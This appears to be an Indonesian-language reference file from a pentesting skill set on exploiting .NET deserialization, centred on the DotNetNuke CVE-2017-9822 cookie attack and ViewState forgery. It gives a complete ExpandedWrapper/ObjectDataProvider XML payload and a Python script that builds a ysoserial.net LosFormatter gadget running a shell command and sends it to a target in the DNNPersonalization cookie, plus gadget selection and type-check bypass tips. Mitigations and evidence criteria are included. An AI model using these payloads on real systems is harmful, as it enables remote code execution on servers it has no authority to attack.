---
name: ".NET Deserialization — XmlSerializer, ExpandedWrapper, LosFormatter"
description: "Eksploitasi deserialization .NET yang terverifikasi: root type dipilih dari input, XmlSerializer + ExpandedWrapper<T1,T2> + ObjectDataProvider, LosFormatter/ObjectStateFormatter sebagai inner payload, ViewState dan machineKey, batas .NET 5+, bukti, dan mitigasi."
tags: [dotnet, deserialization, xmlserializer, expandedwrapper, objectdataprovider, losformatter, viewstate, ysoserial]
---

# .NET Deserialization — XmlSerializer, ExpandedWrapper, LosFormatter

Pola yang paling sering diajarkan untuk DotNetNuke (CVE-2017-9822) **bukan** "cookie 3DES dengan kunci hardcoded + LosFormatter". Pola yang terverifikasi dari generator ysoserial.net adalah:

> Sink memilih **root type dari input**, lalu `new XmlSerializer(Type.GetType(input)).Deserialize(...)`. Attacker memilih `System.Data.Services.Internal.ExpandedWrapper<T1,T2>`; wrapper memasukkan T1 ke scope tipe XmlSerializer, sehingga `xsi:type` boleh menunjuk T1 dan `ObjectDataProvider` dapat memanggil method pada instance T1. Cookie `DNNPersonalization` dikirim sebagai **XML polos**, tanpa enkripsi.

Klaim kunci hardcoded `F8B2E5D9A7C34F1B` dan "dekripsi 3DES lalu LosFormatter" tidak punya sumber; jangan dipakai.

## 1. Serializer dan statusnya

| Serializer | Object graph | Type info di payload | .NET 5+ | Catatan |
|---|---|---|---|---|
| BinaryFormatter | penuh | ya (type + assembly) | obsolete 5–8, **selalu throw di 9** | binder bukan mitigasi |
| LosFormatter | penuh | ya | hanya .NET Framework | tanpa binder; ViewState/DNN |
| ObjectStateFormatter | penuh | ya | hanya .NET Framework | ViewState |
| NetDataContractSerializer | penuh | ya | tidak diporting **[UNVERIFIED]** | setara BinaryFormatter |
| SoapFormatter | penuh | ya | hanya .NET Framework | setara |
| XmlSerializer | terbatas tipe yang dideklarasikan | tidak, kecuali `xsi:type` untuk member `object`/known types | ada | aman hanya bila root type tetap |
| DataContractSerializer | terbatas kontrak | `i:type` untuk known types | ada | butuh KnownTypes |
| JavaScriptSerializer | JSON | `__type` bila resolver dipasang | hanya Framework | `SimpleTypeResolver` = RCE |
| Newtonsoft.Json | JSON | `$type` (`TypeNameHandling`) | ada | default `None`; `Auto/All` = RCE |

## 2. Konstruksi payload

1. Pastikan sink memakai atribut `type` (atau parameter) untuk memilih root type. Tanpa itu, pola ini tidak berlaku.
2. T1 = tipe yang diselundupkan ke scope (`System.Web.UI.ObjectStateFormatter` untuk rantai dua tahap). T2 = `System.Windows.Data.ObjectDataProvider`.
3. Type string: `System.Data.Services.Internal.ExpandedWrapper\`2[[T1, asm...],[T2, asm...]], System.Data.Services, ...`.
4. Nama elemen anak mengikuti konvensi XmlSerializer: `ExpandedWrapperOf<T1><T2>`.
5. `<ExpandedElement/>` = instance T1 kosong; kehadirannya yang mendaftarkan T1 ke scope.
6. `<ProjectedProperty0>` memuat `MethodName`, `MethodParameters`, dan `ObjectInstance xsi:type="T1"`.
7. Inner payload: `ObjectStateFormatter.Deserialize(base64 ...)` — di sinilah LosFormatter/BinaryFormatter tetap relevan.

```xml
<profile><item key="k" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
 <ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ExpandedElement/>
  <ProjectedProperty0>
   <MethodName>Deserialize</MethodName>
   <MethodParameters><anyType xsi:type="xsd:string">BASE64_INNER_GADGET</anyType></MethodParameters>
   <ObjectInstance xsi:type="ObjectStateFormatter"/>
  </ProjectedProperty0>
 </ExpandedWrapperOfObjectStateFormatterObjectDataProvider>
</item></profile>
```

Mengapa berhasil meski XmlSerializer tidak menyimpan type info: aplikasi memilih root type dari input; properti bertipe `object` menerima `xsi:type`; dan `ExpandedWrapper<T1,T2>` menambahkan T1 ke scope lewat properti `ExpandedElement`. Setter `ObjectInstance`/`MethodName` memicu `Refresh()` → `BeginQuery` → `InvokeMember(...)`.

## 3. Generator dan pengiriman

```python
import base64, subprocess, requests

inner = subprocess.check_output([
    "ysoserial.exe", "-f", "LosFormatter", "-g", "TypeConfuseDelegate",
    "-c", "cmd /c whoami > C:\\inetpub\\wwwroot\\p.txt"
]).decode().strip()

t1 = "System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
t2 = "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
xml = (
    '<profile><item key="k" type="System.Data.Services.Internal.ExpandedWrapper`2'
    f'[[{t1}],[{t2}]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">'
    '<ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">'
    '<ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName>'
    f'<MethodParameters><anyType xsi:type="xsd:string">{inner}</anyType></MethodParameters>'
    '<ObjectInstance xsi:type="ObjectStateFormatter"/></ProjectedProperty0>'
    '</ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>'
)
r = requests.get("http://target/", cookies={"DNNPersonalization": xml}, timeout=20)
print(r.status_code, len(r.content))
```

Prasyarat runtime: `System.Data.Services` (WCF Data Services) dan `PresentationFramework` (WPF) harus ada di host. Aplikasi .NET Core tanpa `Microsoft.WindowsDesktop.App` tidak punya `ObjectDataProvider` — gadget mati sebelum dikirim.

## 4. ViewState dan machineKey

ViewState memakai format `ObjectStateFormatter` dan dilindungi `machineKey` (AES/HMAC). Tanpa `validationKey`/`decryptionKey` — dari `web.config`, `machine.config`, atau `configSource` — ViewState tidak bisa diforge. `AutoGenerate`/`IsolateApps` membuat kunci per-mesin.

ysoserial.net menyediakan plugin ViewState (`--validationkey`, `--decryptionkey`, `--generator`). Bedakan error MAC (kunci salah) dari error deserialization (payload salah) — keduanya bukan bukti eksekusi.

## 5. Bukti

- Request/response mentah berisi payload + timestamp; status 200/500 bukan bukti.
- Callback OOB dari perintah, atau berkas output dengan isi yang diharapkan.
- Breakpoint dnSpy pada `XmlSerializer.Deserialize` / `ObjectStateFormatter.Deserialize` dengan argumen = payload kita, lalu stack ke sink.
- Bukti negatif: error "type could not be resolved" atau "error generating XML document" berarti tipe/assembly tidak cocok, bukan berhasil.

## 6. Jebakan

- Ciphertext 3DES atau base64 panjang tidak otomatis BinaryFormatter: payload DNN CVE-2017-9822 justru XML polos; ViewState base64 adalah `ObjectStateFormatter`.
- Kompresi: sebagian aplikasi meng-gzip payload (`GZipStream`/`DeflateStream`); dekompres sebelum membaca magic bytes.
- Gadget bergantung versi: `TypeConfuseDelegate` butuh `SortedSet`/`ComparisonComparer` (.NET 4.x); `ActivitySurrogateSelector` diblokir proteksi tipe .NET 4.8+ (gunakan `ActivitySurrogateDisableTypeCheck`); `TextFormattingRunProperties` butuh WPF.
- `SerializationBinder` saja tidak cukup: DoS tidak termitigasi binder, dan LosFormatter/ObjectStateFormatter/XmlSerializer tidak punya binder.
- Jangan klaim RCE dari stack trace atau "payload terkirim".

Mitigasi di akar masalah: jangan memilih tipe dari input (`Type.GetType` dari request), whitelist tipe tetap, migrasi ke `System.Text.Json`/`DataContractSerializer` dengan kontrak tetap, nonaktifkan `BinaryFormatter`, rotasi `machineKey`, `ViewStateEncryptionMode=Always`.

## 7. Best Practices

- Verifikasi apakah sink benar-benar memilih tipe dari input sebelum menyusun payload.
- Cocokkan assembly host (WPF, Data Services) sebelum memilih gadget.
- Uji dengan perintah non-destruktif; simpan bukti negatif saat tipe gagal resolve.
- Bedakan forgery ViewState dari deserialization cookie; keduanya punya prasyarat berbeda.
- Catat versi runtime .NET dan daftar assembly — gadget tanpa itu tidak bisa direproduksi.

## 8. Rujukan

- [source-recovery-debugging.md](./source-recovery-debugging.md) — menemukan sink dari DLL dan machineKey.
- [java-web-exploitation.md](./java-web-exploitation.md) — padanan untuk Java (XXE, HSQLDB/H2).
- ysoserial.net (`DotNetNukePlugin.cs`, `ObjectDataProviderGenerator.cs`, `ViewStatePlugin.cs`).
- Microsoft: BinaryFormatter security guide; XmlSerializer/ObjectDataProvider API docs.
